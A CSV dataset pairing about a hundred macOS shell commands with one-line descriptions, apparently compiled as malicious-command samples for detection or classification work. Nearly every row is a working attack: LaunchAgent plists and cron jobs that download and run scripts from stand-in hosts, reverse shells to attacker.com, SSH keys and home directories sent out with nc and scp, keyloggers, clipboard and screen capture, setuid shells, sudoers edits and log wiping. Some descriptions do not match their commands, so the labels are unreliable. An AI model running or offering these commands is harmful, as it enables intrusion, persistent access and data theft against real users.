"cmd","description"
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Persistence via login item by adding a hidden application to the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/osascript</string>
		<string>-e</string>
		<string>do shell script ""curl http://malicious-url.com/remote_code.sh | sh""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist to execute remote code upon user login."
"Persistence via cron job to exfiltrate documents by email.","Automatic exfiltration of documents from a macOS system using a scheduled cron job that attaches documents to an email."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist in launchd to establish a reverse shell on system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/path/to/malicious/bufferoverflow</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to execute a buffer overflow attack on macOS."
"echo ""*/5 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence via crontab to execute a script every 5 minutes."
"echo ""*/30 * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/script.sh)\"""" | crontab -","Persistence establishment by adding a cron job to periodically download and execute a script from a remote server."
"grep 'authentication failure' /var/log/auth.log > /tmp/failed_login_attempts.txt","Tracking user authentication events by monitoring the system logs for failed login attempts."
"ps axo pid,ppid,pcpu,pmem,comm | grep -v grep | grep '\.\/'","Identifying hidden processes by altering the ps command output format to avoid detection."
"Persistence via malicious plist after opening a phishing email attachment.","Infiltration of a macOS system via a phishing email attachment that executes a ransomware payload when opened."
"curl -s http://malicious-url.com/ransomware_payload -o ~/Library/LaunchAgents/com.malicious.ransomware.plist && launchctl load ~/Library/LaunchAgents/com.malicious.ransomware.plist","The plist file is configured to download and execute the ransomware payload from a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/env</string>
		<string>sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence on macOS via a malicious Launch Agent plist file that executes a shell script on user login."
"curl -s http://malicious-url.com/fake-update.sh | sh","Malware installation through a fake software update prompt executed in the terminal."
"ssh -fN -R 2222:localhost:22 attacker@remote-server.com","Establishing a reverse SSH tunnel from a compromised macOS system to allow secure access for data exfiltration."
"tar -czvf /tmp/data-archive.tgz /path/to/sensitive/data","Compressing a directory containing sensitive data before exfiltration on a macOS system."
"hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://remote-server.com","Using SSH to perform a brute force attack against a remote server's SSH service from a macOS system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/evil.app"", hidden:false}'","Persistence via login item added to a user's login items list."
"echo 'curl -s http://malicious-url.com/remote.sh | sh' > /Applications/MediaPlayer.app/Contents/MacOS/startup && chmod +x /Applications/MediaPlayer.app/Contents/MacOS/startup","Persistence via trojanized media player software that executes a remote shell script upon launch."
"sudo tcpdump -i en0 -w ~/Desktop/captured_traffic.pcap","Capturing network packets to monitor traffic and analyze data on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell connection on system boot."
"bash -c ""$(curl -fsSL http://suspicious-url.com/install.sh)""","Malware installation via a disguised Bash script downloaded from a phishing email."
"osascript -e 'Tell application ""System Events"" to display dialog ""Enter Apple ID Password:"" default answer """" with hidden answer' > /tmp/credentials.txt","Phishing attack script that masquerades as a legitimate service to capture user credentials."
"echo 'cat ~/.ssh/id_rsa | nc -w 3 attacker.com 5555' >> ~/.bash_profile","Credential interception by appending a command to the .bash_profile to send stored SSH keys to a remote server."
"echo '157.240.1.35 facebook.com' | sudo tee -a /etc/hosts","DNS spoofing by altering the /etc/hosts file to redirect traffic to a malicious site."
"cp /path/to/malicious_script.osax /Library/ScriptingAdditions/malicious_script.osax","Persistence via scripting addition by placing a malicious script in the ScriptingAdditions directory."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.ssh/rc","Persistence by adding a malicious script to SSH login sequence."
"ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa && cat ~/.ssh/id_rsa.pub | ssh username@target.com 'cat >> ~/.ssh/authorized_keys'","Gaining unauthorized remote access to a macOS system by exploiting weak SSH daemon configurations."
"cp /bin/sh /tmp/privileged_sh && chmod 4755 /tmp/privileged_sh && /tmp/privileged_sh -p","Privilege escalation by exploiting a setuid binary to gain root access."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a cron job that downloads and executes a script every hour."
"while true; do screencapture -x ~/captures/$(date +%s).png; sleep 300; done & osascript -e 'tell application ""System Events"" to set visible of every application process to false' && python -m SimpleHTTPServer 8000","Automating the capture of screenshots at regular intervals and distributing them via peer-to-peer sharing."
"curl -s http://malicious-url.com/fakeupdate.pkg > /tmp/fakeupdate.pkg && sudo installer -pkg /tmp/fakeupdate.pkg -target /","Infection of macOS system by installing a trojan application disguised as a legitimate software update."
"curl -o ~/Library/.hiddenkeylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hiddenkeylogger && ~/Library/.hiddenkeylogger & disown","A scenario where a keylogger is installed to monitor and log keystrokes on a macOS system."
"while true; do pbpaste > /tmp/clipboard.log; sleep 10; done & disown","A method for monitoring and capturing clipboard content on a macOS system."
"echo '*/1 * * * * pbpaste >> ~/Library/Logs/clipboard_capture.log && curl --upload-file ~/Library/Logs/clipboard_capture.log http://malicious-url.com/upload' | crontab -","An approach to set up automatic clipboard capture to a file that is periodically sent to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.payload</string>
	<key>ProgramArguments</key>
	<array>
		<string>curl</string>
		<string>-o</string>
		<string>/tmp/payload</string>
		<string>http://malicious-url.com/payload</string>
		<string>;</string>
		<string>chmod</string>
		<string>+x</string>
		<string>/tmp/payload</string>
		<string>;</string>
		<string>/tmp/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.payload.plist && launchctl load ~/Library/LaunchAgents/com.malicious.payload.plist","Persistence via malicious plist file that executes a remote payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.cloud.exfiltrate</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>zip -r /tmp/data.zip ~/Documents && /usr/bin/curl -X PUT -T /tmp/data.zip https://cloud-storage.com/upload</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
 <integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.cloud.exfiltrate.plist && launchctl load ~/Library/LaunchAgents/com.cloud.exfiltrate.plist","Persistence via malicious plist to exfiltrate data through cloud services."
"chmod o+w /var/log/system.log","Privilege escalation by manipulating file permissions to gain write access to system logs."
"chmod 777 /var/log/system.log","Privilege escalation by manipulating file permissions to alter system logs permissions."
"sudo chown $(whoami) /var/log/system.log","Changing ownership of log files to gain unauthorized access."
"echo ""* * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" | crontab -","Persistence mechanism involving the scheduling of a cron job to repeatedly execute a script hosted on a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.exploit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/path/to/exploit/binary</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.exploit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.exploit.plist","Persistence via malicious plist file to exploit kernel vulnerabilities for privilege escalation."
"screencapture -x ~/Desktop/capture.png && curl -T ~/Desktop/capture.png ftp://attacker.com/uploads/","Screen capture automation to exfiltrate sensitive information."
"echo 'while :; do nc -e /bin/sh attacker_ip 4444; sleep 300; done' >> ~/.hidden_backdoor && chmod +x ~/.hidden_backdoor && echo '@reboot ~/.hidden_backdoor' | crontab -","Persistence via a hidden backdoor using reverse shell on macOS."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script downloaded from a remote server."
"curl -o /tmp/exploit.zip http://malicious-url.com/exploit.zip && unzip /tmp/exploit.zip -d /tmp/exploit && sh /tmp/exploit/run.sh","Exploit kit execution by decompressing a ZIP file containing the kit and running it."
"echo ""* * * * * /bin/bash -i >& /dev/tcp/c2.server.com/8080 0>&1"" | crontab -","Establishing command and control communication by adding a cron job to ping back to a C2 server periodically."
"curl -o ~/Library/Updates/update.sh http://malicious-url.com/update.sh && chmod +x ~/Library/Updates/update.sh && ~/Library/Updates/update.sh","Updating malware by fetching the latest version from a remote server and executing it."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell connection."
"curl -s http://compromised-repository.com/fakeupdate.pkg > /tmp/update.pkg && sudo installer -pkg /tmp/update.pkg -target /","Malware installation via a disguised software update command."
"curl -s http://malicious-url.com/install.sh | bash","Malware installation through a disguised Bash script downloaded from a remote server."
"cat /tmp/malicious_binary >> /usr/bin/legitimate_binary","Rootkit embedding by appending a malicious binary to an existing system binary."
"sudo insmod /tmp/malicious_module.ko","Kernel module injection using insmod with a tainted kernel module."
"sudo defaults write /Library/LaunchDaemons/com.apple.loginwindow.plist Program /tmp/malicious_script","Boot process tampering by modifying the system's launchd daemons."
"osascript -e 'do shell script ""chmod +s /path/to/vulnerable/kernel/binary"" with administrator privileges'","Privilege escalation by exploiting a use-after-free vulnerability in macOS kernel."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/script.sh</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every time the user logs in."
"tar -czf hidden_data.tar.gz ~/Documents/sensitive/* && exiftool -comment='$(base64 hidden_data.tar.gz)' image.jpg","Compressing sensitive documents and hiding them in image metadata."
"echo ""* * * * * /usr/bin/find / -type f -size +100M -exec /bin/cp {} /Volumes/USB/ ""; crontab -l | { cat; echo ""* * * * * /usr/bin/find / -type f -size +100M -exec /bin/cp {} /Volumes/USB/ ""; } | crontab -","Persistence via unauthorized file monitoring script in crontab."
"sudo tcpdump -i en0 -w unauthorized_capture.pcap","Capturing network traffic on a macOS system without authorization."
"echo '*/5 * * * * /usr/bin/curl http://malicious-url.com/rootkit.sh | /bin/bash' | sudo crontab -","Privilege escalation by injecting malicious code into root's crontab."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
 </array>
 <key>StartInterval</key>
 <integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via Launch Agent by scheduling a task that downloads and executes a script every hour."
"echo 'PATH=/usr/local/bin:/usr/bin:/bin' > /tmp/.hidden && echo '@reboot root cd / && run-parts --report /etc/cron.hourly' >> /tmp/.hidden && crontab /tmp/.hidden","Privilege escalation by exploiting cron jobs with obfuscated commands."
"tar -czvf sensitive_data.tar.gz /path/to/sensitive/files","Sensitive files are being compressed into an archive using tar before exfiltration."
"split -b 10m sensitive_data.tar.gz 'sensitive_data.tar.gz.part-'","The archive is being split into multiple smaller files to avoid detection during exfiltration."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.keylogger</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/Users/Shared/keylogger.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to log keystrokes"
"zip -r /tmp/documents.zip ~/Documents && scp /tmp/documents.zip user@legitimate-server.com:/path/to/legitimate/directory","Compressing sensitive files in the user's Documents directory and exfiltrating them via SSH using scp, with the transfer disguised as legitimate traffic."
"scp ~/.ssh/id_rsa user@remote-server.com:/path/to/upload","Data exfiltration by uploading SSH private keys to a remote server."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Setting up remote access by adding a public key to the authorized_keys file."
"cp ~/.ssh/id_rsa /tmp/evil_location","Theft of SSH keys by copying the private key to an attacker-controlled location."
"echo 'ssh-rsa AAAAB3Nza... attacker@domain.com' > ~/.ssh/authorized_keys","Replacing the public key in the authorized_keys file with an attacker's key."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation using a disguised curl command to retrieve a malicious payload from a remote server and execute it."
"echo 'echo ""malicious code"" > /etc/malicious_startup.sh' >> /etc/rc.common","Rootkit embedding by appending a malicious script to an existing system startup file."
"touch ~/.hidden_stolen_data && chmod 000 ~/.hidden_stolen_data","Creation of hidden files in the system to store stolen data."
"sed -i '' '/attack_signature/d' /var/log/system.log","System log alterations to hide evidence of an attack."
"osascript -e 'do shell script ""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"" with administrator privileges'","Injecting code into privileged processes on macOS to escalate privileges."
"while read -r line; do echo $line >> ~/Library/.keystroke_log; done < /dev/tty","A script that captures keystrokes and saves them to a file for later retrieval."
"ssh -D 1337 -q -C -N user@example.com","Establishing dynamic port forwarding to create a SOCKS proxy for data exfiltration."
"while true; do screencapture -x ~/Library/Logs/screenshot_$(date +'%Y%m%d%H%M%S').png; sleep 300; done & echo 'while [ 1 ]; do cat /dev/input/keyboard0 > ~/Library/Logs/keystroke_$(date +'%Y%m%d%H%M%S').log; sleep 60; done' >> ~/.zshrc && source ~/.zshrc","Capturing keystrokes and taking periodic screenshots for data exfiltration on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.backdoor.agent</string><key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>-e</string><string>do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor on macOS."
"find / -type f -mmin -5","Identifying unauthorized file copies by monitoring file access timestamps."
"tar czf - ~/ | openssl enc -aes-256-cbc -e -k secretkey | nc -w 3 attacker.com 8888","Exfiltration of the entire user's home directory to a remote server."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile && source ~/.bash_profile","Setting up remote access by installing a reverse shell that connects back to the attacker's server."
"ssh -N -R 2222:localhost:22 user@attacker.com","Forwarding a local port to a remote server to tunnel traffic through the compromised machine."
"osascript -e 'tell application ""System Events"" to keystroke ""logging keystrokes""' >> /Applications/TargetApp.app/Contents/MacOS/TargetApp &","Persistent keylogging by appending a script to capture keystrokes to an application's launch process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_script.sh</string>
		<string>http://malicious-url.com/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via malicious plist file"
"TF=$(mktemp -u); cp $(which dash) $TF; chmod +s $TF; $TF -p","Privilege escalation by exploiting a setuid binary to execute a shell as a superuser."
"osascript -e 'tell application ""Finder"" to load script file ""/Library/ScriptingAdditions/malicious.osax""'","Persistence mechanism via scripting addition in macOS"
"echo '#!/bin/bash\ncurl -fsSL http://malicious-url.com/payload.sh | bash' > /Library/StartupItems/Payload/StartupParameters.plist","Creating a startup item to execute a payload on macOS"
"sudo defaults write com.apple.loginwindow LoginHook /path/to/malicious/script.sh","Using LoginHook script to establish persistence"
"osascript -e 'do shell script ""chmod 4755 /bin/bash"" with administrator privileges'","Privilege escalation by exploiting a patched kernel flaw through a race condition"
"sudo defaults write com.apple.loginwindow LoginHook /path/to/malicious/script.sh","Persistence via login hook that executes a script every time a user logs in."
"find / -perm -4000 -type f -exec chmod o+w {} \;","Privilege escalation by exploiting SUID bit on a vulnerable binary to modify system logs permissions."
"chmod 777 /var/log/system.log","Altering system logs permissions to gain unauthorized access to sensitive log files."
"echo 'CVE-2021-XYZ: Exploit code' > /path/to/log/management/software/vulnerable/script","Exploiting vulnerabilities in log management software to escalate privileges and modify file permissions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.backdoor</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"cp /bin/sh /tmp/privilegedsh && chmod +s /tmp/privilegedsh && /tmp/privilegedsh -p","Privilege escalation by exploiting a setuid binary."
"TF=$(mktemp) && echo '#!/bin/sh
/bin/sh -i' > $TF && chmod +x $TF && cp $TF /tmp/privileged && chmod u+s /tmp/privileged && /tmp/privileged","Abusing setuid binaries to execute arbitrary code with elevated privileges."
"rar a -v10m -R sensitive-docs.rar ~/Documents/Sensitive && cat sensitive-docs.rar image.jpg > hidden.jpg","Compression of sensitive documents into a multi-part RAR archive followed by concealing it within an image file on a macOS system."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"sudo sh -c 'mkdir /.hidden && mv script.sh /.hidden/ && chmod +x /.hidden/script.sh && /.hidden/script.sh'","Rootkit embedding through a hidden directory and executing a local script with elevated privileges."
"DYLD_INSERT_LIBRARIES=malicious.dylib /Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp","Process hooking by injecting code into running processes using dynamic libraries."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reinstall</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -s http://malicious-url.com/install.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reinstall.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reinstall.plist","Establishing persistent hooks by adding a script to launchd that reinstalls the malware if removed."
"screencapture -x ~/Desktop/screenshot.png","Capturing screenshots of user activity silently on macOS systems."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access."
"echo '* * * * * cd /usr/local/bin/ && sudo ./malicious_script.sh' | crontab -","Privilege escalation by exploiting crontab to execute a script from a common directory with elevated privileges."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Malicious command to escalate privileges by adding an unauthorized user to the sudoers file without proper permissions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login"
"find ~/Documents -name '*.pdf' -exec echo {} \; | while read file; do uuencode ""$file"" ""$(basename ""$file"")"" | mail -s ""Sensitive Document"" -a ""From: exfiltrator@example.com"" recipient@example.com; done","Exfiltrating sensitive documents from a macOS system by sending them via email using an automated script."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence mechanism using scripting additions to load malicious code at login"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.persist</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/remote_access_tool</string><string>-o</string><string>/tmp/remote_access_tool</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.persist.plist && launchctl load ~/Library/LaunchAgents/com.malicious.persist.plist","Persistence via malicious plist to maintain access to macOS systems."
"while :; do read -rsn1 input; if [ ""$input"" = ""a"" ]; then screencapture -x ~/Desktop/screenshot_$(date +%s).png; fi; done","A script that captures the screen every time a specific key is pressed."
"script -q /dev/null | gzip > ~/Library/Logs/user_activity_$(date +%Y%m%d%H%M%S).log.gz &","A command to log user activity discreetly."
"sudo python -c 'import sys, time; f = open(""/.hidden_keystrokes"", ""a""); while True: c = sys.stdin.read(1); f.write(c); f.flush(); time.sleep(0.01);' < /dev/tty > /dev/null 2>&1 &","A keylogger that writes keystrokes to a hidden file."
"curl -o ~/Library/.hidden_script http://malicious-url.com/install.sh && chmod +x ~/Library/.hidden_script && ~/Library/.hidden_script","Malware installation via a disguised script downloaded from the internet."
"cat /tmp/malicious_payload >> /bin/legitimate_binary && chmod +x /bin/legitimate_binary","Rootkit embedding by appending a malicious payload to an existing system binary."
"touch ~/Library/.hidden_stolen_data && chmod 600 ~/Library/.hidden_stolen_data","Creation of a hidden file in the user's home directory to store stolen data."
"sudo kextload /tmp/malicious_extension.kext","Kernel module tampering to insert a malicious kernel extension."
"chmod u+s /bin/bash","Privilege escalation by exploiting SUID bit on a binary to run a shell with root privileges."
